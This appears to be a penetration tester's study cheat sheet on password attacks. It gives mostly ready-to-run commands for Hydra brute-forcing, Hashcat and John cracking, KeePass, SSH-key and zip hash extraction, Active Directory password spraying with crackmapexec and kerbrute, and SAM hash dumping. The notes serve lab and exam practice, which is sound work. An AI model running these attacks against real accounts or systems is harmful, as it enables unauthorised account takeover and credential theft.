## Hydra
Principle here is to gather a username by some other enumeration method. If none can be found then be sure to try `Administrator` on Windows and `root` on Linux.
```bash
cd /usr/share/wordlists/rockyou.txt; sudo gzip -d rockyou.txt.gz
hydra -l <candidate username> -P /usr/share/wordlists/rockyou.txt -s <target port> ssh://<target IP>
```
Assuming you have secured a valid password by some other means but without a username you can leverage _password spraying_.
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "lolzageVerySecurity" rdp://<target IP>
```
Hitting an HTTP endpoint:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt <target IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
Hitting a page using http basic auth:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target IP> http-get
```

## nmap

The `passwords.txt` argument can be ommitted, if it is then a default password database will be used. It will begin with checking if the password is the same as the username, which is a nice touch that's easily forgotten about otherwise.
```bash
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <target IP>
```

## Hash Cracking

### Hashcat
Standard `hashcat` usage:
```bash
hashcat crackable.txt /usr/share/wordlists/rockyou.txt
```
For debugging a new rule:
```bash
head /usr/share/wordlists/rockyou.txt > demo.txt
hashcat -r newrule.rule --stdout demo.txt
```
See https://hashcat.net/wiki/doku.php?id=rule_based_attack for docs on the syntax for rules based attacks. Spaces separate discrete instructions to apply to one word. Newlines define a new pattern to attempt. Save it in a `.rules` file.
```bash
hashcat -m <insert hashing algo id here (0 for md5)> crackme.txt /usr/share/wordlists/rockyou.txt -r nonsense.rule --force
```

All of the above is kinda cringe though. Just make use of a rulefile thats been crafted for us:
```bash
hashcat -m 0 crackable.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```


### Hashid
Hashcat seems to kinda suck at identifying the hash in use for some reason. Fortunately `hashid` doesn't. Nb. take care to use quotes, particularly if your hash starts with a `$` or other syntactically important character.
```bash
hashid "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"
```

### keepass2john
```bash
keepass2john allTehS3cre75.kdbx > keepass.hash
```
Be sure to drop the username and colon that is prepended to `keepass.hash`. Hashcat will parse it as a salt and get sad otherwise.
```bash
hashcat -h | grep KeePass | awk -F ' ' '{print $1}' 
hashcat -m <output of the above> keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
Once cracked `kpcli` is our friend:
```bash
kpcli Database.kdbx
```
User `cd` and `ls` to navigate to the secret of interest:
```bash
kpcli:/> show -a -f <int value of entry of interest>
```

### JohnTheRipper
In the event that Hashcat isn't working for whatever reason, consider making use of John:
```bash
john --wordlist=<password list> --rules=<rule Name> <our Hash>
```
Nb. with rules passed to John we can use the same syntax as with Hashcat, however we must prepend the file with:
```
[List.Rules:<rule Name>]
```
and we must be sure to add the rule file to the John config:
```bash
sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'
```

If we have an `id_rsa` file that we've managed to dump via some means (eg. path traversal in an http server) the we must first make it digestible for John:
```bash
ssh2john id_rsa > ssh.hash
```
nb. if we want to later log in to the SSH server using the credentials we've just recovered we may need to go ahead and `chmod` the private key file. Try both 600 and 400.

Similarly if we have an encrypted zip, then we'll wanna get it back to Kali, then run:
```bash
zip2john zippyboi.zip > hopefully-crackable
```
then
```bash
john hopefully-crackable
```

## Active Directory Password Cracking

Back to directly targeting an authentication interface, now in the context of AD. For all of the following it is well worth checking the password policy with `net accounts` in order to be sure that we don't immediately get locked out of every account we hit. All of the following assume that we have obtained a plaintext password by some other means, but don't yet have a matching username.

### Spray-Passwords.ps1
Querying LDAP and ADSI with user creds. This will need to be run on the target machine, however a benefit of this is that it will enumerate which users to hit for us.
```powershell
.\Spray-Passwords.ps1 -Pass 'bigboi123!' -Admin
```
```powershell
.\Spray-Passwords.ps1 -File passwords.txt -Admin
```

### crackmapexec
Another approach to password spraying against a Windows machine is available to us courtesy of `crackmapexec`. To target SMB shares with a username list and a known/candidate password (nb. We should take care to check the domain password policy with `net accounts` before we start blasting):
```bash
crackmapexec smb 192.168.12.34 -u users.txt -p '123456' -d corp.com --continue-on-success
```

### kerbrute
This time our brute forcing is aimed at obtaining a Kerberos Ticket Granting Ticket (TGT):
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "password123"
```

### SAM/SYSTEM
If we have managed to find a backup of an old Windows system then we may have unprivileged access to a SYSTEM and SAM file, containing secrets and credentials from that old system. Some of the hashes may still be relevant. Get the `SAM` and `SYSTEM` files back to Kali and parse like so:
```bash
impacket-secretsdump -sam SAM -system SYSTEM local > old-hashes.txt
```